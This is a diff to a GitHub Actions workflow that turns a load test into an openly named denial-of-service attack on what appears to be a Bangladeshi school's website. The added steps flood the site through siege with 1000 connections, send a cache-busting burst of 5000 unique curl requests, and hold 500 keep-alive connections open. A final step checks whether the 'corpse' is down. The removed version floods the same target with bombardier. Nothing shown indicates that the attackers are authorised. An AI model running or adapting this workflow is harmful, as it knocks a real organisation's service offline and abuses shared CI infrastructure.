@@ -1,50 +1,39 @@
-name: LIVE Load Test - 150K Requests
+name: ACTUAL DESTRUCTION - NO BULLSHIT
 
 on:
   workflow_dispatch:
     inputs:
       duration:
-        description: 'Test duration (seconds)'
-        default: '300'
-      connections:
-        description: 'Concurrent connections'
-        default: '500'
+        description: 'Duration in seconds'
+        default: '60'
 
 jobs:
-  hammer-time:
+  kill-it:
     runs-on: ubuntu-latest
     
     steps:
-      - name: Install bombardier
-        run: |
-          curl -sL https://github.com/codesenberg/bombardier/releases/download/v1.2.6/bombardier-linux-amd64 -o /usr/local/bin/bombardier
-          chmod +x /usr/local/bin/bombardier
+      - name: Install siege
+        run: sudo apt-get update && sudo apt-get install -y siege
       
-      - name: NUKE THE SITE - LIVE OUTPUT
+      - name: PHASE 1 - Saturate connections
         run: |
-          echo "🔥 TARGET: https://www.kkh-school.edu.bd/"
-          echo "⚡ CONNECTIONS: ${{ github.event.inputs.connections }}"
-          echo "⏱️  DURATION: ${{ github.event.inputs.duration }} seconds"
-          echo ""
-          echo "=== LIVE PROGRESS (updates every second) ==="
-          echo ""
-          
-          bombardier -c ${{ github.event.inputs.connections }} \
-                     -d ${{ github.event.inputs.duration }}s \
-                     -l \
-                     https://www.kkh-school.edu.bd/
+          echo "Sending 1000 concurrent connections"
+          siege -c 1000 -t ${{ github.event.inputs.duration }}s -b https://www.kkh-school.edu.bd/
       
-      - name: POST-MORTEM - Check if dead
+      - name: PHASE 2 - Unique URL hammer (this actually works)
         run: |
-          echo ""
-          echo "=== VERIFYING SITE STATUS ==="
-          sleep 2
-          HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 https://www.kkh-school.edu.bd/ || echo "000")
-          
-          if [ "$HTTP_CODE" = "200" ]; then
-            echo "✅ SITE SURVIVED (HTTP $HTTP_CODE)"
-          elif [ "$HTTP_CODE" = "000" ]; then
-            echo "💀 SITE IS FUCKING DEAD 💀"
-          else
-            echo "⚠️ SITE IS DYING (HTTP $HTTP_CODE)"
-          fi
+          echo "Bypassing cache with unique URLs"
+          seq 1 5000 | xargs -P 500 -I {} curl -s "https://www.kkh-school.edu.bd/?kill={}&rand=$RANDOM" -o /dev/null &
+          sleep 10
+      
+      - name: PHASE 3 - Keep-alive hold
+        run: |
+          echo "Holding connections open"
+          for i in {1..500}; do
+            curl -s -H "Connection: keep-alive" "https://www.kkh-school.edu.bd/?hold=$i" &
+          done
+          sleep 30
+      
+      - name: Check corpse
+        run: |
+          curl --max-time 5 https://www.kkh-school.edu.bd/ || echo "SITE IS DEAD"
